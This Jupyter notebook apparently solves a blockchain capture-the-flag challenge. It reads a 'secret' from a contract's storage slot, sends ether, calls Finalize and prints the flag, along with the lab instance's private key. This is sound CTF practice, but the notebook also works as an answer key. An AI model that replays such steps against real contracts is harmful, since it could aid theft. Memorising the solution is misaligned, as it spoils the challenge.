{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 37,
   "metadata": {},
   "outputs": [],
   "source": [
    "from foundpy import *"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 38,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "session already found, skipping PoW...\n",
      "UUID: 2b88162f-b722-4cc8-bfb8-90eb5c9a3d84\n",
      "RPC Endpoint: http://103.178.153.113:30001/2b88162f-b722-4cc8-bfb8-90eb5c9a3d84\n",
      "Private Key: 0x30388bf671d2e724e2b5f88d91e19272860fbe25876752c649f07338f9e210ed\n",
      "Setup Contract: 0x8d5135204F3301FD69De4d9113B1F0E02ea00000\n",
      "Wallet: 0x6069A44771265Db25FB9b345d368D87DDe6cEAD4\n",
      "Message: your private blockchain has been deployed, it will automatically terminate in 30 minutes\n"
     ]
    }
   ],
   "source": [
    "result = config.from_tcp1p(\"http://103.178.153.113:30001\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 39,
   "metadata": {},
   "outputs": [],
   "source": [
    "config.change_solc_version(\"0.8.25\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 40,
   "metadata": {},
   "outputs": [],
   "source": [
    "setup = Contract(result[\"setup_contract\"], \"Setup.sol\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 41,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "False"
      ]
     },
     "execution_count": 41,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "setup.call(\"isSolved\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 42,
   "metadata": {},
   "outputs": [],
   "source": [
    "briefing = Contract(setup.call(\"brief\"), \"Briefing.sol\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 43,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "HexBytes('0x417687ca68993a6993d62468158752d1f586db7f4b8a38d9f21b1e6a37b44b5a')"
      ]
     },
     "execution_count": 43,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "briefing.send(\"verifyCall\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 44,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "HexBytes('0x0bae0682b36b13cfcbb046ee21032446c231f30579e03fab776c4f502de16724')"
      ]
     },
     "execution_count": 44,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "briefing.send(\"firstDeposit\", value=int(5 * 10**18))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 45,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "HexBytes('0x58d3d9fc9dbc32da5ca5c10e19785016daff537e1a2c625256152e249cbddcc8')"
      ]
     },
     "execution_count": 45,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "briefing.send(\"putSomething\", 1337, \"Casino Heist Player\", config.wallet.address)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 46,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'0x898133245359fC28e0aEE0D1e3022daef28bcA36'"
      ]
     },
     "execution_count": 46,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "briefing.address"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 47,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'NowYouKnowStorageIsNotThatSafe..'\n"
     ]
    }
   ],
   "source": [
    "# secret = bytes.fromhex(\"4e6f77596f754b6e6f7753746f7261676549734e6f7454686174536166652e2e\")\n",
    "secret = briefing.storage(0)\n",
    "print(secret)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 48,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1922215132079289491\n"
     ]
    }
   ],
   "source": [
    "print(config.wallet.get_balance())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 49,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "HexBytes('0x830040b8b4a8232ba2cfc6d6431a8c20ae2066362b61e65579b396916aee61a4')"
      ]
     },
     "execution_count": 49,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# config.wallet.send(briefing.address,int(1 * 10**18))\n",
    "# cast.send(briefing.address, \"\", value=ether(1))\n",
    "briefing.send(\"\", value=ether(1))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 51,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "HexBytes('0xe7b76b099ab5e6a26a7a0fc83ded922a6fb07b7c4f569a2a9e7e5046970f6324')"
      ]
     },
     "execution_count": 51,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "briefing.send(\"Finalize\", secret)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "True"
      ]
     },
     "execution_count": 52,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "setup.call(\"isSolved\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'ENUMA{Briefing_completed!_Now_Gearing_up!}'"
      ]
     },
     "execution_count": 53,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "config.flag()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
